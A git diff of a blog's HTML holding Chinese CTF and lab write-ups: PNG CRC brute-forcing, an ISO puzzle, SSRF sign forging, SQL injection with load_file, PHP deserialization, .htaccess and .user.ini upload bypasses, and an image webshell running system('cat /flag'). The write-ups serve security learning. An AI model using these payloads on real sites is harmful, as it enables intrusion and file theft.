+<p>对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；<strong>windows的图片查看器会忽略错误的CRC校验码，因此会显示图片</strong>，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。而<strong>Linux下的图片查看器不会忽略</strong>错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况<br>所以判断一张图<strong>是否为crc校验出错 就丢windows 和 linux 里头看看</strong><br>可以通过爆破图片修改前的宽和高来匹配CRC校验码，并用正确的宽和高来修复图片<br>首先先爆破高度 脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#_ *_ coding:utf-8 _ *_ </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment">#\x49 x48 x44 x52 x00 x00 x01 x41 x00 x00 x01 x4C x08 x06 x00 x00 x00</span></span><br><span class="line">crc32key=<span class="number">0xc20f1fc6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">65535</span>):</span><br><span class="line">    height = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)</span><br><span class="line">    <span class="comment">#CRC:c20f1fc6</span></span><br><span class="line">    data= <span class="string">&#x27;\x49\x48\x44\x52\x00\x00\x01\x41&#x27;</span> + height + <span class="string">&#x27;\x08\x06\x00\x00\x00&#x27;</span></span><br><span class="line">    crc32result= binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> c: <span class="string">&quot;%02X&quot;</span> % <span class="built_in">ord</span>(c),height))</span><br></pre></td></tr></table></figure>
+
+<p> 这题就这样爆破出来了 高度被修改了 实则 00 00 03 4C<br>判断是否为crc校验码错误的方法：</p>
+<p>windows下图片可以打开，其他系统下图片不能打开<br>使用010editor的template检测，这也是我16进制编辑器力推010editor的原因之一<br>使用诸如tweakpng，pngcheck等工具<br>修复png的crc检验码方法：</p>
+<p>本文中所列的爆破出正确的宽或高，并用16进制编辑器修复<br>利用windows忽略crc检验码的特性，我们可以用tweakpng任意修改图片的宽和高，直至得到有用的信息，事实上，这是最快的方法</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/11/page-54/" data-id="ckrosnluj000ymow7hqmgb0od" data-title="page[ASIS 2019]Unicornshop1" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/07/13/page-66/" data-id="ckrosnlur001amow7egol8pav" data-title="BJDCTF2020一叶障目" class="article-share-link">Share</a>
       
       
       
@@ -204,10 +258,10 @@
 
 
   
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-page-65" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/06/11/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2021-06-11T09:19:15.345Z" itemprop="datePublished">2021-06-11</time>
+    <a href="/2021/07/08/page-65/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T09:03:48.000Z" itemprop="datePublished">2021-07-08</time>
 </a>
     
   </div>
@@ -218,7 +272,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/11/hello-world/">Hello World</a>
+      <a class="p-name article-title" href="/2021/07/08/page-65/">强网杯ISO1995</a>
     </h1>
   
 
@@ -226,24 +280,18 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+        <p>提示时间属性出问题<br>年月日时分秒以此下来发现</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/9.png?raw=true" alt="9.png"></p>
+<p>除了月的不一样其余均相同 然后将月的对应的数据提取出来 也就是将ffff后面两位的内容提取出来</p>
+<p>第一个是0000也就是十进制的0填充好前四位0000也就是编号为0000的文件对应的文件列表为flag_f00000文件<br><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/7.PNG?raw=true" alt="7.PNG"></p>
+<p>import binascii<br>isofilename= ‘iso1995.iso’<br>fp_iso_file = open(isofilename, ‘rb’)<br>fp_iso_file.read(90198)<br>list=[]<br>num=0<br>while 1:<br>    if (fp_iso_file.read(4) == b’\xff\xff\xff\xff’):<br>        x = str(binascii.b2a_hex(fp_iso_file.read(2)[::1]))<br>        y = ‘0x’+x[2:6]<br>        list.append(int((y),16))<br>        fp_iso_file.read(54)<br>        if (fp_iso_file.tell() - 0x1700A ) % 0x800 ==0:<br>            fp_iso_file.read(8)<br>    else:<br>        break<br>fp_extract_data = open(‘outdata’, ‘wb’)<br>for num in list:<br>    fp_f0_file = open(‘flag_f0’+’%04d’ % num, ‘rb’)<br>    flag0_data = fp_f0_file.read()<br>    fp_extract_data.write(flag0_data)<br>    fp_f0_file.close()<br>fp_extract_data.close()</p>
+<p>运行完成生成outdata 打开找到flag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/8.PNG?raw=true" alt="8.PNG"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/11/hello-world/" data-id="ckrosnlu40007mow73x1f9wg6" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/07/08/page-65/" data-id="ckrosnluq0019mow7dxnp65h1" data-title="强网杯ISO1995" class="article-share-link">Share</a>
       
       
       
@@ -255,10 +303,10 @@
 
 
   
-    <article id="post-page-53" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-page-64" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/05/27/page-53/" class="article-date">
-  <time class="dt-published" datetime="2021-05-27T06:59:00.000Z" itemprop="datePublished">2021-05-27</time>
+    <a href="/2021/07/08/page-64/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:52:06.000Z" itemprop="datePublished">2021-07-08</time>
 </a>
     
   </div>
@@ -269,7 +317,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/27/page-53/">那啥ciscn2021杂项的running pixel</a>
+      <a class="p-name article-title" href="/2021/07/08/page-64/">BUUCTF WEB De1CTF 2019 SSRF Me</a>
     </h1>
   
 
@@ -277,238 +325,55 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>奔跑的像素点蛤？</p>
-<p>跑？ 把所有的帧给提取出来</p>
-<p>丢Stegsolve 里头看了看 red plane3 看了看 都有一个点比较另类的</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/aaa.jpg?raw=true" alt="aaa.jpg"><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/ccc.jpg?raw=true" alt="ccc.jpg"></p>
-<p>然后ps看这个点的像素值总会含有这个RGB: 233,233,233的像素块  部分像素颜色为233，233，233将颜色为233，233，233区块的位置尝试画出来 </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/ddd.jpg?raw=true" alt="ddd.jpg"></p>
-<p>from PIL import Image</p>
-<p>flag_img = Image.new(‘1’,(400,400))<br>#mode=1 1位黑白像素，每字节存储一个像素<br>for name in range(10,383):    #这边应给得从1开始<br>    framepic = Image.open(‘0_f’+str(name)+’.gif’)   #然后这边0_f0 应该为这样 跑完前十张图后改称这样<br>    framepic = framepic.convert(“RGB”)<br>    width,height = framepic.size<br>    for w in range(width):<br>        for h in range(height):<br>            if framepic.getpixel((w,h)) == (233,233,233):<br>                flag_img.putpixel((h,w),1)</p>
-<p>flag_img.save(‘./flag/‘+str(name)+’.png’)     （从别的大佬那拿来的脚本）</p>
-<p>和刚才的所有的导出的帧数放在同一个文件夹 跑完程序就<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/bbb.jpg?raw=true" alt="bbb.jpg">可以了  </p>
-<p>得到这张图慢慢拼图就能拿到flag了</p>
+        <p>题目直接给了题目源码： 就是看着有点难受</p>
+<p>#! /usr/bin/env python<br>#encoding=utf-8<br>from flask import Flask<br>from flask import request<br>import socket<br>import hashlib<br>import urllib<br>import sys<br>import os<br>import json<br>reload(sys)<br>sys.setdefaultencoding(‘latin1’)</p>
+<p>app = Flask(<strong>name</strong>)</p>
+<p>secert_key = os.urandom(16)</p>
+<p>class Task:<br>    def <strong>init</strong>(self, action, param, sign, ip):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr<br>            os.mkdir(self.sandbox)</p>
+<pre><code>def Exec(self):                                              
+    result = &#123;&#125;
+    result[&#39;code&#39;] = 500
+    if (self.checkSign()):                                               //Exec 这边还有个checkSign的方法 
+        if &quot;scan&quot; in self.action:
+            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
+            resp = scan(self.param)
+            if (resp == &quot;Connection Timeout&quot;):
+                result[&#39;data&#39;] = resp
+            else:
+                print resp
+                tmpfile.write(resp)
+                tmpfile.close()
+            result[&#39;code&#39;] = 200
+        if &quot;read&quot; in self.action:
+            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
+            result[&#39;code&#39;] = 200
+            result[&#39;data&#39;] = f.read()
+        if result[&#39;code&#39;] == 500:
+            result[&#39;data&#39;] = &quot;Action Error&quot;
+    else:
+        result[&#39;code&#39;] = 500
+        result[&#39;msg&#39;] = &quot;Sign Error&quot;
+    return result
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/27/page-53/" data-id="ckrosnluj000zmow74ue849i0" data-title="那啥ciscn2021杂项的running pixel" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-52" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/27/page-52/" class="article-date">
-  <time class="dt-published" datetime="2021-05-27T05:15:22.000Z" itemprop="datePublished">2021-05-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/27/page-52/">ciscn robot</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>其实包里面给了这么多东西就只有那个抓包文件有用 其他的不会用</p>
-<p>.pcapng那个文件里面Value.[62,49,0] 有好多这种样子的总共<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/sss.PNG?raw=true" alt="sss.PNG"></p>
-<p>这么多个可以试着把这些点抓出来然后python画图一下</p>
-<p>这个先另存txt先</p>
-<p>from PIL import Image<br>import re</p>
-<p>reg = re.compile(r’Value.[(\d+),(\d+),(\d+)]‘)  ;正则匹配符合的项</p>
-<p>with open(‘ro.txt’,’r’) as f:<br>data = reg.findall(f.read())<br># print(data)<br># print(len(data))</p>
-<p>img = Image.new(‘1’, (400, 400))<br>for i in data:<br>xy = (int(i[0]), int(i[1]))<br>img.putpixel(xy, 1)<br>img.save(“md5flag.png”)</p>
-<p>这边ro.txt 和MD5flag.png 自己命名去</p>
-<p>运行一下可以生成图片</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/md5flag.png?raw=true" alt="md5flag.png"></p>
-<p>然后图片内容MD5加密一下就是flag</p>
-<p>但这可能不是预期解法就是了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/27/page-52/" data-id="ckrosnlui000wmow75xa1398k" data-title="ciscn robot" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-aaa" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/26/aaa/" class="article-date">
-  <time class="dt-published" datetime="2021-05-26T13:47:03.000Z" itemprop="datePublished">2021-05-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/26/aaa/">那啥ciscn2021杂项的running pixel</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>奔跑的像素点蛤？</p>
-<p>跑？ 把所有的帧给提取出来</p>
-<p>丢Stegsolve 里头看了看 red plane3 看了看 都有一个点比较另类的<img src="%5Caaa%5Caaa.jpg" alt="aaa"></p>
-<p><img src="%5Caaa%5Cccc.jpg" alt="ccc"></p>
-<p>然后ps看这个点的像素值总会含有这个RGB: 233,233,233的像素块  部分像素颜色为233，233，233将颜色为233，233，233区块的位置尝试画出来 </p>
-<p><img src="%5Caaa%5Cddd.jpg" alt="ddd"></p>
-<p>from PIL import Image</p>
-<p>flag_img = Image.new(‘1’,(400,400))<br>#mode=1 1位黑白像素，每字节存储一个像素<br>for name in range(10,383):    #这边应给得从1开始<br>    framepic = Image.open(‘0_f’+str(name)+’.gif’)   #然后这边0_f0 应该为这样 跑完前十张图后改称这样<br>    framepic = framepic.convert(“RGB”)<br>    width,height = framepic.size<br>    for w in range(width):<br>        for h in range(height):<br>            if framepic.getpixel((w,h)) == (233,233,233):<br>                flag_img.putpixel((h,w),1)</p>
-<p>flag_img.save(‘./flag/‘+str(name)+’.png’)</p>
-<p>和刚才的所有的帧数放在同一个文件夹 跑完程序就可以了  <img src="%5Caaa%5Cbbb.jpg" alt="bbb"></p>
-<p>慢慢拼图就能拿到flag了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/26/aaa/" data-id="ckrosnlu10002mow7bsag8pnu" data-title="那啥ciscn2021杂项的running pixel" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-47" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/03/page-47/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:59:01.000Z" itemprop="datePublished">2021-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-47/">dvwa 文件上传</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>low 直接上传后门文件检查都不检查的</p>
-<p>medium 上传的时候用jpg 然后burp改或者直接php 然后burp从Content-Type 那边改image/jpeg </p>
-<p>high 上传图片马然后用文件包含漏</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-47/" data-id="ckrosnluh000vmow7g65e74ty" data-title="dvwa 文件上传" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-46" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/03/page-46/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:58:56.000Z" itemprop="datePublished">2021-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-46/">刷题4</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>[网鼎杯2018]fakebook题解</strong>  先注册一个 然后发现/view.php?no=1 貌似可以sql注入?no=-1 显示了Notice: Trying to get property of non-object in /var/www/html/view.php on line 53 数字型 的所有就?no=0  扫后台发现robots.txt 然后又发现一个user.php.bak   可以大概猜一猜flag位置<br>然后这又是一个序列化题目<br>&lt;?php</p>
-<p>class UserInfo<br>{<br>    public $name = “aaad”;<br>    public $age = 19;<br>    public $blog = “file:///var/www/html/flag.php”;</p>
-<pre><code>public function __construct($name, $age, $blog)
-&#123;
-    $this-&gt;name = $name;
-    $this-&gt;age = (int)$age;
-    $this-&gt;blog = $blog;
-&#125;
-
-function get($url)
-&#123;
-    $ch = curl_init();
-
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $output = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    if($httpCode == 404) &#123;
-        return 404;
-    &#125;
-    curl_close($ch);
-
-    return $output;
-&#125;
-
-public function getBlogContents ()
-&#123;
-    return $this-&gt;get($this-&gt;blog);
-&#125;
-
-public function isValidBlog ()
-&#123;
-    $blog = $this-&gt;blog;
-    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
-&#125;
+def checkSign(self):
+    if (getSign(self.action, self.param) == self.sign):                        //getSign()方法，结果与sign进行比较
+        return True
+    else:
+        return False
 </code></pre>
-<p>}<br>$a = new UserInfo(“aaad”,19,”file:///var/www/html/flag.php”);<br>var_dump(serialize($a));<br>?&gt;   构造这个然后复制一波 aaad 19 4399 这些是自己弄 要弄什么都可以 ?no=-1/<strong>/union/</strong>/select/<strong>/1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:4:”aaad”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’  然后右键查看源码 有个data text 啥的<br>那段复制然后base64解码就可<br>或者因为sql注入没有过滤load_file直接取得flag<br>no=-1 union/</strong>/select 1,load_file(“/var/www/html/flag.php”),3,4<br><strong>[GXYCTF2019]BabySQli 1</strong>  union select 1，2，3   在这个关要构造假身份     利用sqli的特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。select * from ‘users’ where name=’person’ union select 1,’admin’,’e10adc3949ba59abbe56057f20f883e’,4,5    按照我们的输入，sqli在数据库中写入数据，相当于伪造了一个身份，就可以用这个身份登录了。<br>试探id username password 这三个的顺序如何 name=aaa’ union select ‘admin’,2 #&amp;pw=qqq   显示wrong user<br>name=aaa’ union select 1,’admin’,3 #&amp;pw=qqq 显示wrong password   然后把3 改成qqq的MD5加密形式就可以了<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%89">https://xz.aliyun.com/t/3674（反序列化的一些知识点）</a><br><strong>[MRCTF2020]你传你🐎呢 1</strong><br><strong>&lt;FilesMatch “1.png”&gt;</strong><br><strong>SetHandler application/x-httpd-php</strong><br><strong></FilesMatch></strong>  传一个这样的.htaccess  这个是将1.png 默认成php   然后传一个1.png的后门文件就可以了<br><strong>[MRCTF2020]Ez_bypass 1</strong>又是一题MD5 比较的 那就数组绕过?gg[]=1&amp;id[]=2<br>然后post一个passwd=1234567a就可以了  因为  if($passwd==1234567)</p>
+<p>#generate Sign For Action Scan.<br>@app.route(“/geneSign”, methods=[‘GET’, ‘POST’])<br>def geneSign():<br>    param = urllib.unquote(request.args.get(“param”, “”))<br>    action = “scan”<br>    return getSign(action, param)</p>
+<p>@app.route(‘/De1ta’,methods=[‘GET’,’POST’])                       //De1ta应该是关键的页面获取了三个参数，其中两个是从cookie中获取的：<br>def challenge():<br>    action = urllib.unquote(request.cookies.get(“action”))                 //第一个参数action是传入read和scan的，<br>                                                                                                         第二个参数看着应该是传入一个文件名，                                                                                                                                                                                                                         第三个参数sign是一个md5值，<br>    param = urllib.unquote(request.args.get(“param”, “”))<br>    sign = urllib.unquote(request.cookies.get(“sign”))                       //cookie<br>    ip = request.remote_addr<br>    if(waf(param)):<br>        return “No Hacker!!!!”<br>    task = Task(action, param, sign, ip)                          // 这边的action param sign参数传递到Task<br>    return json.dumps(task.Exec())                                 //并且调用了 Task类中的Exec()<br>@app.route(‘/‘)<br>def index():<br>    return open(“code.txt”,”r”).read()               //这边index 把源码给打开了</p>
+<p>def scan(param):<br>    socket.setdefaulttimeout(1)<br>    try:<br>        return urllib.urlopen(param).read()[:50]<br>    except:<br>        return “Connection Timeout”</p>
+<p>def getSign(action, param):<br>    return hashlib.md5(secert_key + param + action).hexdigest()                            //这边需要一个secert_key </p>
+<p>def md5(content):<br>    return hashlib.md5(content).hexdigest()</p>
+<p>def waf(param):<br>    check=param.strip().lower()<br>    if check.startswith(“gopher”) or check.startswith(“file”):<br>        return True<br>    else:<br>        return False</p>
+<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    app.debug = False<br>    app.run(host=’0.0.0.0’)<br>python的flask框架，三个路由</p>
+<p>  最终目的就是读取flag.txt<br>所以我们需要构造参数！第一个参数action应该包含read，，第二个param参数应该是文件名<br>最关键就是第三个参数，由于我们不知道secert_key的值，所以不能自己加密<br>  burp  访问一下geneSign这个页面 参数param=flag.txt得到一串MD5值b7e7fa9d237b24617caedc3fa85fe2af  这个就是md5(secert_key+flag.txtscan)的值<br>param 需要read 和scan的值               8a75379bb998db129cca0db40be1a07b   geneSign?param=flag.txtread传入这个后得到的<br>也就是md5(secert_key+flag.txtreadscan)的md5值                 再访问De1ta页面进行参数传递，拿到flag<br>De1ta?param=flag.txt<br>cookie：  action=readscan;sign=8a75379bb998db129cca0db40be1a07b;<br>就能拿到flag了</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-46/" data-id="ckrosnlug000tmow75mny65jf" data-title="刷题4" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/07/08/page-64/" data-id="ckrosnluq0018mow7ar3hao8z" data-title="BUUCTF WEB De1CTF 2019 SSRF Me" class="article-share-link">Share</a>
       
       
       
@@ -520,10 +385,10 @@ public function isValidBlog ()
 
 
   
-    <article id="post-page-45" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-page-63" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/05/03/page-45/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:58:52.000Z" itemprop="datePublished">2021-05-03</time>
+    <a href="/2021/07/08/page-63/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:52:05.000Z" itemprop="datePublished">2021-07-08</time>
 </a>
     
   </div>
@@ -534,7 +399,7 @@ public function isValidBlog ()
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-45/">刷题3</a>
+      <a class="p-name article-title" href="/2021/07/08/page-63/">NCTF2019fakeXMLcookbook</a>
     </h1>
   
 
@@ -542,29 +407,343 @@ public function isValidBlog ()
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p><strong>[ACTF2020 新生赛]BackupFile 1</strong> 问你能不能找到源文件 dirsearch扫一波发现一个index.php.bak 然后打开发现  $str = “123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”;<br>    if($key == $str) {<br>        echo $flag;  这串代码 两个等号是弱等于的意思 大概就是有几个一样的就可以echo flag 就?key=123 就可以了<br><strong>[HCTF 2018]admin 1</strong>  这关注册一个账号之后在改密码那个页面找到了这个类似于源代码的地址<br>方法一：flask session伪造 （不懂）<br>方法二：Unicode欺骗 在更改密码那边有一串源码用到strlower 就把用户名的字母转成小写  name = strlower(session[‘name’])<br>def strlower(username):<br>    username = nodeprep.prepare(username)<br>    return username<br>         这个nodeprep.prepare存在漏洞。我们还会发现，login的时候又strlower一次。这个本来是转小写的，但是如果我们注册的用户名是这个：注册用户ᴀdmin（这个是unicode字符） 登录用户ᴀdmin，变成Admin  改密码时被变成admin 巧妙<br>login的时候会经过一次strlower会编程ADMIN,在change password的时候会变成admin。因此可以更改admin的密码，从而完成登录。  那么我们改密码的时候就变成改admin的了<br>就很巧妙的解题方法<br><strong>[极客大挑战 2019]BuyFlag 1</strong>  抓包改包  buyflag那边可以找到一部分信息 抓 send to repeater  然后就添加money和password的信息<br>还有改一下cookie 能够被识别为那个什么g开头的什么的学生 user=1 就可以了  然后源码拿password后面俩== 那和上面那个差不多 就404a 这个作为password就可以<br> 或者hackbar 改cookie和postdata </p>
-<p><strong>[BJDCTF2020]Easy MD5 1</strong> 这关转回响包发现hint那边有select * from ‘admin’ where password=md5($pass,true)  百度了下这玩意是什么没看懂 <strong>反正就是有个万能密码ffifdyop</strong> 这个字符串造成的漏洞<br>本地环境试验ffifdyop，输出的开头是’or’6xxxxxx<br>在数据库语句里就构成了select * from ‘admin’ where password= ‘’or’6xxxxxx ’ 相当于 password= ‘’ or 1 变成永真式<br>输入ffifdyop  然后去到另一个页面 源码<br>$a = $GET[‘a’];<br>$b = $_GET[‘b’];</p>
-<p>if($a != $b &amp;&amp; md5($a) == md5($b))   然后可以用数组方式绕过   ?a[]=1&amp;b[]=2  又到另一个页面 然后是post  param1[]=1&amp;param2[]=2 用数组的方式可以绕过很多检测<br><strong>[SUCTF 2019]CheckIn 1 -&gt;</strong> 上传过滤为黑名单，但php脚本文件应该是无法上传的</p>
-<p>-&gt; 存在文件头过滤，需要添加图片文件的文件头</p>
-<p>-&gt; 文件的内容不能包含&lt;?，但可以上传<script language='php'><scirpt>类型的图片马来绕过<br>exif_imagetype:not image!这个回显只要添加以下文件头就可以了  GIF89a 类似这个<br> 服务器是nginx 1.10.3，似乎版本较高，不存在解析漏洞。上传不了.htaccess<br>.user.ini 可以利用这个来制作后门<br>两个有趣的设置：auto_prepend_file和auto_append_file<br>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);</p>
-<p>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）<br>上传一个这样的.user.ini：</p>
-<p>GIF89a<br>auto_prepend_file=a.jpg  让index.php 解析a.jpg<br> 然后再上传一个这样的图片马a.jpg：</p>
-<p>GIF89a</p>
-<script language='php'>system('cat /flag');</script>   另存为a.jpg
+        <p>看到题目名字XML，XXE漏洞<br>XML<br>什么是 XML？<br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。<br>XML基本格式与基本语法<br>基本格式：</p>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!--xml文件的声明-->
+<p><bookstore>                                                 <!--根元素--><br><book category="COOKING">        <!--bookstore的子元素，category为属性--></p>
+<title>Everyday Italian</title>           <!--book的子元素，lang为属性-->
+<author>Giada De Laurentiis</author>                  <!--book的子元素-->
+<year>2005</year>                                     <!--book的子元素-->
